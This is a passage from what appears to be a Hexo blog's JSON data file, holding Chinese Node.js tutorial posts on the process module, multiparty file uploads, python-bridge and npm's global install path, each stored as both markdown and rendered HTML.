stdout**\\\n`process.stdout`用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。\n````\nexports.log = function() {\n    process.stdout.write(format.apply(this, arguments) + '\\n');\n};\n````\n\n**2. argv**\n\n`process.argv` 返回`命令行脚本`的 各个参数 组成的数组。\n\n先新建一个脚本文件 argv.js。\n````\n// argv.js\n \nconsole.log(\"argv: \",process.argv);\nconsole.log(\"argc: \",process.argc);\n````\n\n在命令行下调用这个脚本，会得到以下结果。\n````\n> node argv.js a b c\n\n# [ 'node', '/path/to/argv.js', 'a', 'b', 'c' ]\n````\n\n上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。\n````\n// argv.js\n \nvar myArgs = process.argv.slice(2);\nconsole.log(myArgs);\n````\n\n### 二、方法\n\n`process`对象提供以下方法：\n\n+ `process.exit()`：退出当前进程。\n+ `process.cwd()`：返回运行当前脚本的工作目录的路径。_\n+ `process.chdir()`：改变工作目录。\n+ `process.nextTick()`：将一个回调函数放在下次事件循环的顶部。\n\n**1. `process.chdir()` 改变工作目录的例子:**\n````\nprocess.cwd()\n# '/home/aaa'\n \nprocess.chdir('/home/bbb')\n \nprocess.cwd()\n# '/home/bbb'\n````\n\n**2. `process.nextTick()` 指定下次事件循环首先运行的任务:**\n````\nprocess.nextTick(function () {\n    console.log('Next event loop!');\n});\n````\n\n上面代码可以用`setTimeout`改写，但是`nextTick`的`效率`更高、`描述`更准确。\n````\nsetTimeout(function () {\n    console.log('Next event loop!');\n}, 0)\n````\n\n### 三、事件\n**1. exit事件**\n\n`当前进程退出`时，会触发`exit事件`，可以对该事件指定`回调函数`。\n\n这是一个用来 `定时检查模块状态` 的好`钩子(hook)`(例如单元测试), 当主事件循环在执行完`'exit'`的回调函数后将不再执行,所以在`exit事件`中定义的定时器可能不会被加入事件列表.\n````\nprocess.on('exit', function () {\n    fs.writeFileSync('/tmp/myfile', 'This MUST be saved on exit.');\n});\n````\n\n**2. uncaughtException事件**\n\n当前`进程抛出`一个没有被捕捉的意外时，会触发uncaughtException事件。\n\n````\nprocess.on('uncaughtException', function (err) {\n    console.error('An uncaught error occurred!');\n    console.error(err.stack);\n});\n````\n\n-----------------\n[阅读原文](http://www.css88.com/archives/4548)","slug":"programmingLanguage/NodeJS/Node-js-process模块","published":1,"updated":"2018-09-05T06:33:18.496Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0r00bizodvu98n5ugo","content":"<h2 id=\"转-Node-js的process模块\"><a href=\"#转-Node-js的process模块\" class=\"headerlink\" title=\"[转]Node.js的process模块\"></a>[转]<a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">Node.js的process模块</a></h2><p><code>process</code>模块用来与<code>当前进程互动</code>，可以 <code>通过全局变量process</code> 访问，不必使用require命令加载。它是一个<code>EventEmitter</code>对象的实例。</p>\n<h3 id=\"一、属性\"><a href=\"#一、属性\" class=\"headerlink\" title=\"一、属性\"></a>一、属性</h3><p>process对象提供一系列属性，用于返回系统信息。</p>\n<ul>\n<li><p>process.pid：当前进程的进程号。</p>\n</li>\n<li><p>process.version：Node的版本，比如v0.10.18。</p>\n</li>\n<li><p>process.platform：当前系统平台，比如Linux。</p>\n</li>\n<li><p>process.title：默认值为“node”，可以自定义该值。</p>\n</li>\n<li><p>process.argv：当前进程的命令行参数数组。</p>\n</li>\n<li><p>process.env：指向当前<code>shell</code>的环境变量，比如<code>process.env.HOME</code>。</p>\n</li>\n<li><p>process.execPath：运行当前进程的可执行文件的绝对路径。</p>\n</li>\n<li><p>process.stdout：指向标准输出。</p>\n</li>\n<li><p>process.stdin：指向标准输入。</p>\n</li>\n<li><p>process.stderr：指向标准错误。</p>\n</li>\n</ul>\n<h4 id=\"主要属性介绍\"><a href=\"#主要属性介绍\" class=\"headerlink\" title=\"主要属性介绍\"></a>主要属性介绍</h4><p><strong>1. stdout</strong>\\<br><code>process.stdout</code>用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.log = function() &#123;</span><br><span class=\"line\">    process.stdout.write(format.apply(this, arguments) + &apos;\\n&apos;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. argv</strong></p>\n<p><code>process.argv</code> 返回<code>命令行脚本</code>的 各个参数 组成的数组。</p>\n<p>先新建一个脚本文件 argv.js。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">console.log(&quot;argv: &quot;,process.argv);</span><br><span class=\"line\">console.log(&quot;argc: &quot;,process.argc);</span><br></pre></td></tr></table></figure></p>\n<p>在命令行下调用这个脚本，会得到以下结果。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; node argv.js a b c</span><br><span class=\"line\"></span><br><span class=\"line\"># [ &apos;node&apos;, &apos;/path/to/argv.js&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]</span><br></pre></td></tr></table></figure></p>\n<p>上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">var myArgs = process.argv.slice(2);</span><br><span class=\"line\">console.log(myArgs);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"二、方法\"><a href=\"#二、方法\" class=\"headerlink\" title=\"二、方法\"></a>二、方法</h3><p><code>process</code>对象提供以下方法：</p>\n<ul>\n<li><code>process.exit()</code>：退出当前进程。</li>\n<li><code>process.cwd()</code>：返回运行当前脚本的工作目录的路径。_</li>\n<li><code>process.chdir()</code>：改变工作目录。</li>\n<li><code>process.nextTick()</code>：将一个回调函数放在下次事件循环的顶部。</li>\n</ul>\n<p><strong>1. <code>process.chdir()</code> 改变工作目录的例子:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/aaa&apos;</span><br><span class=\"line\"> </span><br><span class=\"line\">process.chdir(&apos;/home/bbb&apos;)</span><br><span class=\"line\"> </span><br><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/bbb&apos;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. <code>process.nextTick()</code> 指定下次事件循环首先运行的任务:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.nextTick(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>上面代码可以用<code>setTimeout</code>改写，但是<code>nextTick</code>的<code>效率</code>更高、<code>描述</code>更准确。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;, 0)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"三、事件\"><a href=\"#三、事件\" class=\"headerlink\" title=\"三、事件\"></a>三、事件</h3><p><strong>1. exit事件</strong></p>\n<p><code>当前进程退出</code>时，会触发<code>exit事件</code>，可以对该事件指定<code>回调函数</code>。</p>\n<p>这是一个用来 <code>定时检查模块状态</code> 的好<code>钩子(hook)</code>(例如单元测试), 当主事件循环在执行完<code>&#39;exit&#39;</code>的回调函数后将不再执行,所以在<code>exit事件</code>中定义的定时器可能不会被加入事件列表.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;exit&apos;, function () &#123;</span><br><span class=\"line\">    fs.writeFileSync(&apos;/tmp/myfile&apos;, &apos;This MUST be saved on exit.&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. uncaughtException事件</strong></p>\n<p>当前<code>进程抛出</code>一个没有被捕捉的意外时，会触发uncaughtException事件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;uncaughtException&apos;, function (err) &#123;</span><br><span class=\"line\">    console.error(&apos;An uncaught error occurred!&apos;);</span><br><span class=\"line\">    console.error(err.stack);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-Node-js的process模块\"><a href=\"#转-Node-js的process模块\" class=\"headerlink\" title=\"[转]Node.js的process模块\"></a>[转]<a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">Node.js的process模块</a></h2><p><code>process</code>模块用来与<code>当前进程互动</code>，可以 <code>通过全局变量process</code> 访问，不必使用require命令加载。它是一个<code>EventEmitter</code>对象的实例。</p>\n<h3 id=\"一、属性\"><a href=\"#一、属性\" class=\"headerlink\" title=\"一、属性\"></a>一、属性</h3><p>process对象提供一系列属性，用于返回系统信息。</p>\n<ul>\n<li><p>process.pid：当前进程的进程号。</p>\n</li>\n<li><p>process.version：Node的版本，比如v0.10.18。</p>\n</li>\n<li><p>process.platform：当前系统平台，比如Linux。</p>\n</li>\n<li><p>process.title：默认值为“node”，可以自定义该值。</p>\n</li>\n<li><p>process.argv：当前进程的命令行参数数组。</p>\n</li>\n<li><p>process.env：指向当前<code>shell</code>的环境变量，比如<code>process.env.HOME</code>。</p>\n</li>\n<li><p>process.execPath：运行当前进程的可执行文件的绝对路径。</p>\n</li>\n<li><p>process.stdout：指向标准输出。</p>\n</li>\n<li><p>process.stdin：指向标准输入。</p>\n</li>\n<li><p>process.stderr：指向标准错误。</p>\n</li>\n</ul>\n<h4 id=\"主要属性介绍\"><a href=\"#主要属性介绍\" class=\"headerlink\" title=\"主要属性介绍\"></a>主要属性介绍</h4><p><strong>1. stdout</strong>\\<br><code>process.stdout</code>用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.log = function() &#123;</span><br><span class=\"line\">    process.stdout.write(format.apply(this, arguments) + &apos;\\n&apos;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. argv</strong></p>\n<p><code>process.argv</code> 返回<code>命令行脚本</code>的 各个参数 组成的数组。</p>\n<p>先新建一个脚本文件 argv.js。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">console.log(&quot;argv: &quot;,process.argv);</span><br><span class=\"line\">console.log(&quot;argc: &quot;,process.argc);</span><br></pre></td></tr></table></figure></p>\n<p>在命令行下调用这个脚本，会得到以下结果。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; node argv.js a b c</span><br><span class=\"line\"></span><br><span class=\"line\"># [ &apos;node&apos;, &apos;/path/to/argv.js&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]</span><br></pre></td></tr></table></figure></p>\n<p>上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">var myArgs = process.argv.slice(2);</span><br><span class=\"line\">console.log(myArgs);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"二、方法\"><a href=\"#二、方法\" class=\"headerlink\" title=\"二、方法\"></a>二、方法</h3><p><code>process</code>对象提供以下方法：</p>\n<ul>\n<li><code>process.exit()</code>：退出当前进程。</li>\n<li><code>process.cwd()</code>：返回运行当前脚本的工作目录的路径。_</li>\n<li><code>process.chdir()</code>：改变工作目录。</li>\n<li><code>process.nextTick()</code>：将一个回调函数放在下次事件循环的顶部。</li>\n</ul>\n<p><strong>1. <code>process.chdir()</code> 改变工作目录的例子:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/aaa&apos;</span><br><span class=\"line\"> </span><br><span class=\"line\">process.chdir(&apos;/home/bbb&apos;)</span><br><span class=\"line\"> </span><br><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/bbb&apos;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. <code>process.nextTick()</code> 指定下次事件循环首先运行的任务:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.nextTick(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>上面代码可以用<code>setTimeout</code>改写，但是<code>nextTick</code>的<code>效率</code>更高、<code>描述</code>更准确。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;, 0)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"三、事件\"><a href=\"#三、事件\" class=\"headerlink\" title=\"三、事件\"></a>三、事件</h3><p><strong>1. exit事件</strong></p>\n<p><code>当前进程退出</code>时，会触发<code>exit事件</code>，可以对该事件指定<code>回调函数</code>。</p>\n<p>这是一个用来 <code>定时检查模块状态</code> 的好<code>钩子(hook)</code>(例如单元测试), 当主事件循环在执行完<code>&#39;exit&#39;</code>的回调函数后将不再执行,所以在<code>exit事件</code>中定义的定时器可能不会被加入事件列表.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;exit&apos;, function () &#123;</span><br><span class=\"line\">    fs.writeFileSync(&apos;/tmp/myfile&apos;, &apos;This MUST be saved on exit.&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. uncaughtException事件</strong></p>\n<p>当前<code>进程抛出</code>一个没有被捕捉的意外时，会触发uncaughtException事件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;uncaughtException&apos;, function (err) &#123;</span><br><span class=\"line\">    console.error(&apos;An uncaught error occurred!&apos;);</span><br><span class=\"line\">    console.error(err.stack);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"Node.js图片上传","date":"2018-07-04T10:24:59.000Z","_content":"## [转][node.js 实现图片上传服务](https://blog.csdn.net/ziyetian666/article/details/79737495)\n\n## 使用multiparty插件实现上传\n### 安装multiparty\n> npm i --save multiparty\n\n### 代码实现\n````\nconst multiparty = require('multiparty');\n\nlet form = new multiparty.Form({uploadDir: upload.path});\n````\n\n### 构造参数说明\n\n`encoding` 设置接收数据编码，默认是utf-8\n\n`maxFieldsSize` 限制字段可以分配的内存量,默认2M\n\n`maxFields` 限制在发出错误事件之前将要解析的字段数,默认1000\n\n`maxFilesSize` 限制总文件大小，默认无穷大\n\n`autoFields` 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。\n\n`autoFiles` 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。\n\n`uploadDir` 文件上传的目录\n\n**如果回调提供，`autofields`和`autofiles`被设置为`true`，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。**\n\n\n### 事件说明\n\n+ part 请求文件数据时触发，回调函数是一个实现可读流的实例对象\n  - headers：头部文件\n  - name：字段名称\n  - filename：文件名称\n  - byteFffset：主体数据的字节偏移量\n  - byteCount：数据总的字节长度\n","source":"_posts/programmingLanguage/NodeJS/Node-js图片上传.md","raw":"---\ntitle: Node.js图片上传\ndate: 2018-07-04 18:24:59\ntags:\ncategories:\n---\n## [转][node.js 实现图片上传服务](https://blog.csdn.net/ziyetian666/article/details/79737495)\n\n## 使用multiparty插件实现上传\n### 安装multiparty\n> npm i --save multiparty\n\n### 代码实现\n````\nconst multiparty = require('multiparty');\n\nlet form = new multiparty.Form({uploadDir: upload.path});\n````\n\n### 构造参数说明\n\n`encoding` 设置接收数据编码，默认是utf-8\n\n`maxFieldsSize` 限制字段可以分配的内存量,默认2M\n\n`maxFields` 限制在发出错误事件之前将要解析的字段数,默认1000\n\n`maxFilesSize` 限制总文件大小，默认无穷大\n\n`autoFields` 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。\n\n`autoFiles` 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。\n\n`uploadDir` 文件上传的目录\n\n**如果回调提供，`autofields`和`autofiles`被设置为`true`，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。**\n\n\n### 事件说明\n\n+ part 请求文件数据时触发，回调函数是一个实现可读流的实例对象\n  - headers：头部文件\n  - name：字段名称\n  - filename：文件名称\n  - byteFffset：主体数据的字节偏移量\n  - byteCount：数据总的字节长度\n","slug":"programmingLanguage/NodeJS/Node-js图片上传","published":1,"updated":"2018-09-05T06:33:18.496Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0s00blzodvy04u3as6","content":"<h2 id=\"转-node-js-实现图片上传服务\"><a href=\"#转-node-js-实现图片上传服务\" class=\"headerlink\" title=\"[转]node.js 实现图片上传服务\"></a>[转]<a href=\"https://blog.csdn.net/ziyetian666/article/details/79737495\" target=\"_blank\" rel=\"noopener\">node.js 实现图片上传服务</a></h2><h2 id=\"使用multiparty插件实现上传\"><a href=\"#使用multiparty插件实现上传\" class=\"headerlink\" title=\"使用multiparty插件实现上传\"></a>使用multiparty插件实现上传</h2><h3 id=\"安装multiparty\"><a href=\"#安装multiparty\" class=\"headerlink\" title=\"安装multiparty\"></a>安装multiparty</h3><blockquote>\n<p>npm i –save multiparty</p>\n</blockquote>\n<h3 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const multiparty = require(&apos;multiparty&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">let form = new multiparty.Form(&#123;uploadDir: upload.path&#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"构造参数说明\"><a href=\"#构造参数说明\" class=\"headerlink\" title=\"构造参数说明\"></a>构造参数说明</h3><p><code>encoding</code> 设置接收数据编码，默认是utf-8</p>\n<p><code>maxFieldsSize</code> 限制字段可以分配的内存量,默认2M</p>\n<p><code>maxFields</code> 限制在发出错误事件之前将要解析的字段数,默认1000</p>\n<p><code>maxFilesSize</code> 限制总文件大小，默认无穷大</p>\n<p><code>autoFields</code> 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。</p>\n<p><code>autoFiles</code> 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。</p>\n<p><code>uploadDir</code> 文件上传的目录</p>\n<p><strong>如果回调提供，<code>autofields</code>和<code>autofiles</code>被设置为<code>true</code>，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。</strong></p>\n<h3 id=\"事件说明\"><a href=\"#事件说明\" class=\"headerlink\" title=\"事件说明\"></a>事件说明</h3><ul>\n<li>part 请求文件数据时触发，回调函数是一个实现可读流的实例对象<ul>\n<li>headers：头部文件</li>\n<li>name：字段名称</li>\n<li>filename：文件名称</li>\n<li>byteFffset：主体数据的字节偏移量</li>\n<li>byteCount：数据总的字节长度</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-node-js-实现图片上传服务\"><a href=\"#转-node-js-实现图片上传服务\" class=\"headerlink\" title=\"[转]node.js 实现图片上传服务\"></a>[转]<a href=\"https://blog.csdn.net/ziyetian666/article/details/79737495\" target=\"_blank\" rel=\"noopener\">node.js 实现图片上传服务</a></h2><h2 id=\"使用multiparty插件实现上传\"><a href=\"#使用multiparty插件实现上传\" class=\"headerlink\" title=\"使用multiparty插件实现上传\"></a>使用multiparty插件实现上传</h2><h3 id=\"安装multiparty\"><a href=\"#安装multiparty\" class=\"headerlink\" title=\"安装multiparty\"></a>安装multiparty</h3><blockquote>\n<p>npm i –save multiparty</p>\n</blockquote>\n<h3 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const multiparty = require(&apos;multiparty&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">let form = new multiparty.Form(&#123;uploadDir: upload.path&#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"构造参数说明\"><a href=\"#构造参数说明\" class=\"headerlink\" title=\"构造参数说明\"></a>构造参数说明</h3><p><code>encoding</code> 设置接收数据编码，默认是utf-8</p>\n<p><code>maxFieldsSize</code> 限制字段可以分配的内存量,默认2M</p>\n<p><code>maxFields</code> 限制在发出错误事件之前将要解析的字段数,默认1000</p>\n<p><code>maxFilesSize</code> 限制总文件大小，默认无穷大</p>\n<p><code>autoFields</code> 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。</p>\n<p><code>autoFiles</code> 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。</p>\n<p><code>uploadDir</code> 文件上传的目录</p>\n<p><strong>如果回调提供，<code>autofields</code>和<code>autofiles</code>被设置为<code>true</code>，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。</strong></p>\n<h3 id=\"事件说明\"><a href=\"#事件说明\" class=\"headerlink\" title=\"事件说明\"></a>事件说明</h3><ul>\n<li>part 请求文件数据时触发，回调函数是一个实现可读流的实例对象<ul>\n<li>headers：头部文件</li>\n<li>name：字段名称</li>\n<li>filename：文件名称</li>\n<li>byteFffset：主体数据的字节偏移量</li>\n<li>byteCount：数据总的字节长度</li>\n</ul>\n</li>\n</ul>\n"},{"title":"Node.js调用Python","date":"2018-07-04T09:37:39.000Z","_content":"## [python-bridge](https://blog.csdn.net/ziyetian666/article/details/80493183)\n\n### npm: [Python-bridge](https://www.npmjs.com/package/python-bridge)\n\n### [API for TypeScript](https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md)","source":"_posts/programmingLanguage/NodeJS/Node-js调用Python.md","raw":"---\ntitle: Node.js调用Python\ndate: 2018-07-04 17:37:39\ntags: Node-Python-bridge\ncategories: Node\n---\n## [python-bridge](https://blog.csdn.net/ziyetian666/article/details/80493183)\n\n### npm: [Python-bridge](https://www.npmjs.com/package/python-bridge)\n\n### [API for TypeScript](https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md)","slug":"programmingLanguage/NodeJS/Node-js调用Python","published":1,"updated":"2018-09-05T06:33:18.496Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0u00bozodv7z0526l7","content":"<h2 id=\"python-bridge\"><a href=\"#python-bridge\" class=\"headerlink\" title=\"python-bridge\"></a><a href=\"https://blog.csdn.net/ziyetian666/article/details/80493183\" target=\"_blank\" rel=\"noopener\">python-bridge</a></h2><h3 id=\"npm-Python-bridge\"><a href=\"#npm-Python-bridge\" class=\"headerlink\" title=\"npm: Python-bridge\"></a>npm: <a href=\"https://www.npmjs.com/package/python-bridge\" target=\"_blank\" rel=\"noopener\">Python-bridge</a></h3><h3 id=\"API-for-TypeScript\"><a href=\"#API-for-TypeScript\" class=\"headerlink\" title=\"API for TypeScript\"></a><a href=\"https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md\" target=\"_blank\" rel=\"noopener\">API for TypeScript</a></h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"python-bridge\"><a href=\"#python-bridge\" class=\"headerlink\" title=\"python-bridge\"></a><a href=\"https://blog.csdn.net/ziyetian666/article/details/80493183\" target=\"_blank\" rel=\"noopener\">python-bridge</a></h2><h3 id=\"npm-Python-bridge\"><a href=\"#npm-Python-bridge\" class=\"headerlink\" title=\"npm: Python-bridge\"></a>npm: <a href=\"https://www.npmjs.com/package/python-bridge\" target=\"_blank\" rel=\"noopener\">Python-bridge</a></h3><h3 id=\"API-for-TypeScript\"><a href=\"#API-for-TypeScript\" class=\"headerlink\" title=\"API for TypeScript\"></a><a href=\"https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md\" target=\"_blank\" rel=\"noopener\">API for TypeScript</a></h3>"},{"title":"nodejs全局安装路径的位置","date":"2018-05-08T03:17:12.000Z","archives":"Node","_content":"一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到\n\n![变量路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png)\n\n\n所谓全局安装：\n\n是指安装在`node`中`node_module`的根目录里，可以在电脑的任何位置调用这个方法。\n\n那么，如何在找到全局安装的位置呢？\n\n\n## <font color=#f00>方法一：</font>\n\n设置到自己想要放的位置：\n\n<font color=#f90 style='font-size:18px'>\n打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径\n\nprefix = E:\\nodejs\\npm_global_modules\n</font>\n\n## <font color=#f00>方法二：</font>\n使用快捷键 `win+R` ,输入cmd打开命令窗口，输入如下代码：\n\n````\n> npm config ls\n````\n\n![npm配置](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png)\n\n<b style='font-size:18px'>\n其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b>\n\n![安装路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png)\n\n这时可以通过命令来更改路径\n\n````\nnpm config set prefix E:\\\n````\n\n-----------------------------\n\n[阅读原文](https://www.cnblogs.com/niuxiaoling/p/7993032.html)","source":"_posts/programmingLanguage/NodeJS/nodejs全局安装路径的位置.md","raw":"---\ntitle: nodejs全局安装路径的位置\ndate: 2018-05-08 11:17:12\ntags: Node全局路径\narchives: Node\ncategories: Node\n---\n一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到\n\n![变量路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png)\n\n\n所谓全局安装：\n\n是指安装在`node`中`node_module`的根目录里，可以在电脑的任何位置调用这个方法。\n\n那么，如何在找到全局安装的位置呢？\n\n\n## <font color=#f00>方法一：</font>\n\n设置到自己想要放的位置：\n\n<font color=#f90 style='font-size:18px'>\n打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径\n\nprefix = E:\\nodejs\\npm_global_modules\n</font>\n\n## <font 